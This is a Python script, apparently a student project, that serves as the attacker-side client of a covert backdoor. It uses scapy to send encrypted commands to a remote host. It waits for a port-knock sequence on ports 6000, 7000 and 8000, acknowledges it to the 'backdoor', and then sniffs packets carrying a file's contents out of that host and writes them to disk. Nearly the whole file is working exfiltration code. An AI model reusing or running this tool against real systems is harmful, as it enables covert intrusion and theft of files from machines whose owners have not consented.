#   File Extraction
#
#   Details -
#   [details of program here]
#
#   Usage   -
#   Run from attacker.sh
#
#   Author  Date        Description
#   GSM     NOV-16      File Creation
#   GSM     NOV-18      File Extraction and Processing
#   GSM/AM  DEC-06      Rest
#

#   Imports
from argparse   import ArgumentParser
from scapy.all  import *
from utils import *

#   Constants

#   Set Arguments
parser = ArgumentParser ( )
parser.add_argument ( "-m", "--mode",   dest = "mode",      help = "Mode of Execution ( download, watch )" )
parser.add_argument ( "-f", "--file",   dest = "file",      help = "Full Path File Name" )
parser.add_argument ( "-d", "--dir",    dest = "directory", help = "Directory to Watch" )
arguments = parser.parse_args ( )

#   Process File
def ProcessFile ( ):
    #   Send Packet Looking For File
    payload = arguments.mode + " " + arguments.directory + " " + arguments.file
    encrypted_payload = encrypt ( payload )

    if ( protocol == "tcp" ):
        packet  = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypted_payload
    elif ( protocol == "udp" ):
        packet  = IP ( src = source, dst = dest ) / UDP ( sport = int ( port ), dport = int ( port ) ) / encrypted_payload
    else:
        print ( "[-] Invalid Protocol Selected" )
        return

    send ( packet )

    payload = ""
    #   While knocked is false, listen for knock. If knocked is true, listen and process responses.
    while ( True ):
        print ( "[+] Listening For Knock" )
        first_knock = sniff ( filter = "port " + str(6000), count = 1 )
        second_knock = sniff ( filter = "port " + str(7000), count = 1 )
        third_knock = sniff ( filter = "port " + str(8000), count = 1 )

        if ( first_knock[0].time - second_knock[0].time < 5 and second_knock[0].time - third_knock[0].time < 5 ):
            print ( "[+] Knock Received" )
            # Send Packet to let backdoor know that knock was received
            payload = "knock is accepted"
            if ( protocol == "tcp" ):
                packet  = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypt ( payload )
                send ( packet )
                Knocked = True
                break

    #   Process Response
    capture = sniff ( filter = "host " + source + " and port " + port, count = 2 )
    counter = decrypt ( capture[0].payload.load )
    print ( "[+] Packets To Receive: " + str ( counter ) )

    capture = sniff ( filter = "host " + source + " and port " + port, count = 2 )
    data    = decrypt ( capture[0].payload.load )

    towrite = ""
    packetsreceived = 0

    #   Handle Error
    if ( data == "filenotfound" ):
        print ( "[-] File Not Found" )
        return
    else:
        #   Overwrite Local File
        with open ( arguments.file, "w" ) as filename:
            filename.write ( data )

        towrite = towrite + data

        runs = int ( counter )
        index = 0
        estimated_time = timeout * runs * 1.2

        print ( "[+] Estimated Time: " + str ( estimated_time ) + " seconds" )

        capture = sniff ( filter = "host " + source + " and port " + port, count = ( 2 * runs - 4 ), timeout = estimated_time * 1.2  )
        for a in range ( len ( capture ) / 2 ):
            index = a * 2
            data = decrypt ( capture[index].payload.load )
            packetsreceived += 1
            towrite = towrite + data

        packetsreceived += 2

        #   Write File
        with open ( arguments.file, "w" ) as filename:
            print ( "[+] Writing: " + towrite )
            filename.write ( str ( towrite ) )

        print ( "[+] Total Packts Received: " + str ( packetsreceived ) + "/" + counter + "\n" )

        #   Success Message
        print ( "[+] File Successfully Written" )

#   Main
print ( "[+] File Extraction" )

#   Read Configuration File
with open ( "config.txt", "r" ) as sendfile:
    config = sendfile.readlines ( )

count = 1
for line in config:
    if ( count == 1 ):
        source = line.rstrip ( )
    elif ( count == 2 ):
        dest = line.rstrip ( )
    elif ( count == 3 ):
        port = line.rstrip ( )
    elif ( count == 4 ):
        protocol = line.rstrip ( )
    elif ( count == 5 ):
        timeout = float ( line.rstrip ( ) )

    count += 1

ProcessFile ( )
